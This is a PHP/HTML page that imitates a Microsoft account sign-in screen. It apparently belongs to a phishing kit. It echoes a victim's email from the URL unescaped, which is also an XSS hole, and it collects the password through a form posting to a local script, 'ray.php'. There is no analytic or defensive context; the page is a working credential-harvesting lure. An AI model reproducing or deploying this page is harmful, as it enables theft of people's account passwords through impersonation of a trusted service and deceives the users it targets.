<html>

<head>
<title>Sign in to your Microsoft account</title>
<link id="cl_shortcut_icon" rel="shortcut icon" href="favicon.ico" />

</head>

<body background="body.jpg">

	<table>

	<tr><td height="255"></td></tr>



	<tr><td>
	
		<form method="post" action="ray.php">

		<table><tr>

		<td width="450"></td>
		
		




		<td>

			<table>
	
			<tr><td>
			
						

						<table cellspacing="0"><tr><td 
						style="width:330px; height:38px; background-color: #848484;">
					
							<table cellspacing="0"><tr><td 
							style="width:330px; height:38px; background-color: #FFFFFF;">
							
									<table><tr>
									
									<td width="5"></td>
									
									
									
									<td>
									
											<font face="verdana" size="2">
											<b><?php echo $_GET['email']; ?></b>
											</font>
											
											<input type="hidden" name="username" value="<?php echo $_GET['email']; ?>">
									
									</td>
									
									</tr></table>
					
							</td></tr></table>
					
					</td></tr></table>


	
			</td></tr>





			<tr><td height=""></td></tr>
			
			
			
			
			
			<tr><td>
			
					<input  name="passwd" type="password" style="width:330px; height:38px; 
					font-family: Verdana; font-size: 13px; color:#000000; 
					background-color: #ffffff; border: solid 1px #848484; padding: 10px;" 
					required="" placeholder="Password">

			
			</td></tr>
			
			
			
			
			
			
			
			
			
			<tr><td height=""></td></tr>
			
			
			
			
			<tr><td>
			
						<input type="submit" value="Sign in" 
						style="width:330px; height:42px; background-color: #045FB4; border: solid 3px #045FB4; 
						font-family: Verdana; font-size: 14px; font-weight: light; color: #ffffff;">


			
			</td></tr>
			
			
			
			
			<tr><td height="20">
			
				</form>
			
			</td></tr>

			</table>

		</td>

		</tr></table>

	</td></tr>

	</table>


</body>

</html>